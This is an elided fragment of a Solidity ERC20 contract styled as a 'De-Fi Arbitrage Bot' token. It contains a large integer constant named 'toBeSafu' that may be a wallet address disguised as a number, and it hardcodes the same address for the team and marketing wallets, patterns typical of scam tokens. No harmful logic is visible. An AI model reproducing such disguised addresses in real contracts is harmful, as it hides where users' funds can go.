...
//Multi Arbitrage Sharing Platform
...
contract  DeFiArbitrageBot is Context, IERC20, Ownable {

    uint256 public toBeSafu=
    1343568463552585191837165193102102777497747778423;
    using SafeMath for uint256;
    string private _name = "De-Fi Arbitrage Bot";
    string private _symbol = "DFARB";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0x89dc1EaB18dCB5f3FC8265660A6c9cA04d97531c));
        marketWall = payable(address(0x89dc1EaB18dCB5f3FC8265660A6c9cA04d97531c));
